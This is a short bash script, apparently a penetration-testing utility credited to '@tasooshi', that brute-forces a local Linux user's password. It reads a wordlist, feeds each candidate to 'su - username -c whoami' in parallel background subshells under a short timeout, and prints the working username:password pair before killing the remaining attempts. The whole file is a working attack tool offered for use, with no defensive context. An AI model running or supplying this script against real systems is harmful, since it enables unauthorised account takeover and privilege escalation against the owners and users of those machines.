#!/bin/bash

# This is a small utility for parallel passwords bruteforcing using
# some tricks in the GNU Linux/bash environment. I wouldn't recommend
# anything above 5k / @tasooshi

if [[ -z $1 ]]; then
    echo "Usage: $0 username passwords.txt"
    exit 1
fi

passwords=($(cat $2))
SIZE=${#passwords[@]}
TIMEOUT='0.25s'

for i in ${!passwords[@]}; do
    echo -ne "$i / $SIZE\r"
    ( echo ${passwords[i]} | timeout $TIMEOUT su - $1 -c 'whoami' 2>/dev/null | grep -ow $1 >/dev/null && echo -e "\n\n$1:${passwords[i]}\n\n" && kill -INT -$$ &)
done
